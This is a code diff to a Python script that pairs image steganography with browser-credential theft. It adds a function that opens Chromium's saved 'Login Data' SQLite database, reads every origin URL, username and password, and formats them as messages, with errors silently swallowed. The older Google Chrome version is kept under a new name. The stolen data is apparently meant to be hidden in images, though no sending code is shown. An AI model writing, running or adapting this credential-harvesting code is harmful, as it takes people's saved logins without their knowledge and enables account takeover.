@@ -6,6 +6,7 @@ from datetime import datetime, timedelta
 import sys
 from time import sleep
 import re
+import sqlite3 as sql
 
 # Function to encode a stego message from image
 def encode(filepath, message):
@@ -33,8 +34,27 @@ def isvalidformat(msg):
 	else:
 		return False
 				
-# Function to decrypt passwords from the browser 
+# Function to decrypt passwords from the browser
 def decrypt_passwords():
+	chrome_path = path.expanduser("~/.config/chromium/Default/Login Data")
+	msglist = []
+	try:
+		db = sql.connect(chrome_path)
+		cur = db.cursor() 
+		cur.execute('select origin_url, username_value, password_value from logins;')
+		savedlist = []
+		rows = cur.fetchall()
+		for row in rows:
+			savedlist.append([str(row[0]),str(row[1]),str(row[2])])		
+		for entry in savedlist:
+			msglist.append(format_msg(entry))		
+	except:
+		pass
+	#print msglist
+	return msglist
+		
+# Function to decrypt passwords from the browser old
+def decrypt_passwords2():
 	chrome_path = path.expanduser("~/.config/google-chrome/Default/Login Data")
 	try:
 		f = open(chrome_path,'r')
@@ -104,7 +124,6 @@ def decrypt_passwords():
 	for entry in savedlist:
 		msglist.append(format_msg(entry))
 	return msglist
-
 
 
 # Function to initialize first time run
